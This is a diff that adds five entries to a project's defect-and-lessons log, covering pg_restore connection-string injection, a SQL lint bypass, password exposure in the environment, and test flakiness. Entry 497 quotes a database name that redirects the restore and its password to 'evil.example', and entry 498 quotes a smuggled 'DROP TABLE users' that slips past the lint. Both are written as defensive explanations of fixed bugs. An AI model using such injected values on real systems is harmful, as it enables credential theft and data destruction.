@@ -12697,3 +12697,96 @@ harness prints the Controller's, not the Runner's.
 
 **Lesson.** A failure that repeats alone on one runner and not on another is still worth a line; two samples are
 how it was told from a code change here.
+
+## 497. pg_restore read the database name as a connection string, so a name could send the restore and its password to another host (a repeat of 450 and 148) (fixed)
+
+**Symptom.** Found 2026-10-16 by the pre-pull-request review of `db.pg`: `db.pg.restore` ran
+`pg_restore --dbname=<database>`. pg_restore reads `--dbname` as a libpq connection string whenever the value holds
+`=` or begins with a URI prefix, so `database: "host=evil.example sslmode=disable dbname=x"` with `create: true`
+made that literal database on the real server, then had pg_restore connect to evil.example with the exported
+password and TLS off. On the old code a name `dbname=app o'b\x` failed with "missing = after o'b\x".
+
+**Root cause.** 450's class in a new shape: a value reaching a command as data where the command parses it as
+options. The name check refused control characters and length only; nothing knew `--dbname` is itself a parser.
+
+**Fix.** Both tools take the name as the dbname of a connection string naming nothing else, quoted
+(`dbname='...'`, `\` and `'` escaped), so host, port, user and TLS always come from the exported settings. The
+release test restores into a database literally named `dbname=app o'b\x` and reads it back.
+
+**Lesson.** An argument that is itself a mini-language (a connection string, a URL, a format string) is an
+injection surface even after `--` and equals form; hand it over in the form that can only mean the one value.
+
+
+## 498. The additive-only lint read string literals one way and the server another, so a DROP ran inside what the lint saw as one INSERT (fixed)
+
+**Symptom.** Found 2026-10-16 by the review; proven on the old code: a migration
+`INSERT INTO n VALUES ('it\''); DROP TABLE users; --');` after a file running `SET standard_conforming_strings =
+off` passed `additive_only` and dropped `users`.
+
+**Root cause.** `pkg/sqllint` lexes a backslash in `'...'` literally, as `standard_conforming_strings = on` does;
+a session with it off (a role or database setting, or an earlier file) reads `\'` as an escaped quote, so the
+server split the text into an INSERT and a DROP where the lint saw one INSERT. The lint also had no answer for
+statements whose effect it cannot read (`DO`, `CALL`, `EXECUTE`, `SELECT f()`), and passed them.
+
+**Fix.** `pkg/pgclient` pins `standard_conforming_strings=on` (with the encoding and date style) at startup;
+migrate checks the setting before each file (the server lexes a whole file before running any of it, so between
+files is enough); and the additive-only judgement fails closed on what it cannot read, waived per file with a
+reason.
+
+**Lesson.** A checker and the system it guards must parse with the same settings, pinned by the checker; a rule
+that reads text must refuse what it cannot read rather than pass it.
+
+
+## 499. The device tools carried the database password in their environment, which PostgreSQL's own documentation advises against (fixed, by the owner's decision)
+
+**Symptom.** Left open by #64's review as 251's class: the device's script exported `PGPASSWORD`, so `pg_dump`,
+`timeout`, `ln` and anything the tool started held it in their environment. On Linux the same user reads
+`/proc/<pid>/environ` (shown here with Yama's ptrace scope at 1); on the owner's Mac (macOS 27) a same-user `ps -E`
+did not show it.
+
+**Root cause.** "Never on a command line" was taken to mean "not observable"; libpq's documentation says
+`PGPASSWORD` "is not recommended for security reasons" and recommends a password file.
+
+**Fix.** The owner chose PostgreSQL's guidance (Ansible's postgresql_db uses PGPASSWORD; Salt and systemd's
+credentials use files). The script makes its private directory (under `XDG_RUNTIME_DIR` where there is one) and
+its trap first, then writes the `*:*:*:user:password` line there with the shell's built-in printf, and exports
+`PGPASSFILE`. A wrapper ahead of the real pg_dump proves no password in its environment, a `-rw-------` file, and
+nothing left after. docs/10 states what remains: the login user and root can read the file during the run.
+
+**Lesson.** State a secret's exposure as who can read it, how, and for how long, then compare options on those
+three; "not on the command line" answers only one of them.
+
+
+## 500. remoteexec's stdin-closing test helper assumed a harness that waited for input, written in the same commit that made it stop waiting (a repeat of 460) (fixed)
+
+**Symptom.** #64's `fast` job, third strict repeat: `TestProcess_WaitReportsNonZeroExitAsStatusNotError`
+"CloseWrite() error = ... EOF". The package was otherwise untouched by the branch. Under `-race` on one CPU it
+failed 886 of 900 runs across the helper's three callers.
+
+**Root cause.** `closeStdin`'s comment said the harness reports no exit until stdin ends; commit `662ffb17`, which
+wrote it, also made the harness end the session when the command ends, as sshd does. For a command that reads no
+input the channel can be closed before the test closes its input, and x/crypto answers `io.EOF`.
+
+**Fix.** The helper accepts `io.EOF` (the channel already closed, the input as closed as it can be) and fails on
+anything else; the same 900 runs pass.
+
+**Lesson.** A helper's comment is a claim about its harness; when the harness changes in the same commit, test the
+helper against the new behavior, under `-race` on one CPU, where ordering races show.
+
+
+## 501. The hop stress test opened more connections at once than one macOS listener holds, and XNU resets the rest (a repeat of 476's class) (fixed)
+
+**Symptom.** 2026-10-16, `make mac-check` on the owner's MacBook Air (first run of `pkg/remoteexec` there):
+`TestConnect_HopChain_StressManyConcurrentSessions` lost 136 to 167 of 300 sessions to "connection reset by peer".
+CI's macOS runner passes it.
+
+**Root cause.** XNU resets connections past what a listener's queue holds, where Linux drops a SYN it has no room
+for and the client sends it again. TCP counters' "listen queue overflow" stayed 0, so it is counted elsewhere.
+Measured with `kern.ipc.somaxconn` 128: 128 sessions passed every run, alone and with the package at `-count=3`;
+192 failed under load; 300 every run.
+
+**Fix.** The test opens `min(300, listenQueue())` at once: `kern.ipc.somaxconn` on darwin, unbounded elsewhere.
+
+**Lesson.** A stress test's load must fit the platform's own limits or it tests the kernel; size it from the
+platform rather than skip it there, and measure the threshold on the platform before choosing.
+
